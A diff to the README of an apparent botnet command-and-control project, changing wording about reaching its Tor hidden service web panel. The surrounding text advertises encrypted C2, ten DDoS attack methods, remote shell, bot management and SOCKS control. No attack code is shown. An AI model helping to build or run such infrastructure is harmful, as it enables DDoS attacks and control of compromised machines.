@@ -28,7 +28,7 @@ TLS 1.3 + AES-256 encrypted C2 with Tor hidden service web panel, 10 DDoS attack
 <td width="50%">
 
 **3 Control Interfaces**
-Tor hidden service web panel (works from any browser without clearnet exposure), interactive Go TUI, or Telnet CLI. RBAC with 4 permission tiers.
+Tor hidden service web panel (works from any browser without clearnet exposure, accessible via Tor Browser), interactive Go TUI, or Telnet CLI. RBAC with 4 permission tiers.
 
 </td>
 <td width="50%">
@@ -179,7 +179,7 @@ All L7 methods support HTTP + SOCKS5 proxy integration.
 
 | Interface | Access | Use Case |
 |:----------|:-------|:---------|
-| **Tor Web Panel** | `.onion` address in any browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log |
+| **Tor Web Panel** | `.onion` address via Tor Browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log |
 | **Go TUI** | `./server --tui` | Interactive terminal dashboard with live bot feed |
 | **Telnet CLI** | `./server --split` (port 420) | Lightweight remote access, scriptable |
 
